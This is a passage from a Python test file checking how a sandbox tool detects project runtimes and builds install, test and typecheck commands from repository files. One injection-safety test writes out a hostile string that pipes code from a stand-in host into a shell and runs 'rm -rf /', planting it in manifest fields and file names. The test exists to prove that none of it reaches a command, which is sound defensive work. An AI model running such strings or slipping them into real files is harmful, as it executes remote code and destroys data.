    assert any("closest" in w for w in d.warnings)


def test_the_default_is_the_newest_supported_runtime() -> None:
    assert max(PYTHON_IMAGE_VERSIONS, key=lambda v: int(v.split(".")[1])) == DEFAULT_PYTHON_VERSION


def test_the_runtime_table_matches_the_image_lock_and_the_dockerfile() -> None:
    from mpilot.sandbox import images as im

    lock = im.read_lock(im.default_images_dir() / im.LOCK_FILENAME)
    for key, entry in lock.images.items():
        if key.startswith("python:"):
            version = key.split(":")[1]
            assert PYTHON_IMAGE_VERSIONS[version] == entry.tools["python"].removeprefix(
                "Python "
            ), key
    python = next(e for e in im.ECOSYSTEMS if e.name == "python")
    assert set(PYTHON_IMAGE_VERSIONS) == set(python.versions)


# --- safety and determinism --------------------------------------------------------------------------------------


def test_repo_text_never_reaches_a_command() -> None:
    hostile = "$(curl evil.example | sh); `id`; rm -rf /"
    body = (
        f'[project]\nname = "{hostile}"\nversion = "0"\nrequires-python = "{hostile}"\n'
        f'dependencies = ["pytest", "{hostile}"]\n'
        f'[project.optional-dependencies]\n"{hostile}" = ["pytest"]\ntest = ["{hostile}"]\n'
        f'[dependency-groups]\n"{hostile}" = ["x"]\n'
        f'[tool.mypy]\nfiles = ["{hostile}"]\n'
        f'[tool.pytest.ini_options]\naddopts = "{hostile}"\n'
    )
    files = {
        "pyproject.toml": body,
        "uv.lock": "",
        ".python-version": hostile,
        f"requirements-dev{hostile}.txt": "x",
        "requirements.txt": hostile,
    }
    d = detect(files)
    commands = [d.install_cmd.value, d.install_unfrozen_cmd.value]
    commands += [c.value for c in (d.test_cmd, d.typecheck_cmd) if c is not None]
    for command in commands:
        assert not any(ch in command for ch in '$`;|&()<>"\\\n'), command
    assert d.runtime_version.value in PYTHON_IMAGE_VERSIONS


def test_detection_is_deterministic_and_immutable() -> None:
    files = {
        "pyproject.toml": UV_EXTRAS,
        "uv.lock": "x",
        "tests/test_a.py": "x",
        "requirements-dev.txt": "pytest\n",
    }
    first = detect(files)
    second = detect(dict(reversed(list(files.items()))))
    assert first == second
    with pytest.raises(AttributeError):
        first.test_cmd = None  # type: ignore[misc]


def test_the_lockfile_hash_is_the_trees_sha256() -> None:
    d = detect({"pyproject.toml": proj(), "uv.lock": "abc"})
    assert d.lockfile_hashes == {"uv.lock": hashlib.sha256(b"abc").hexdigest()}
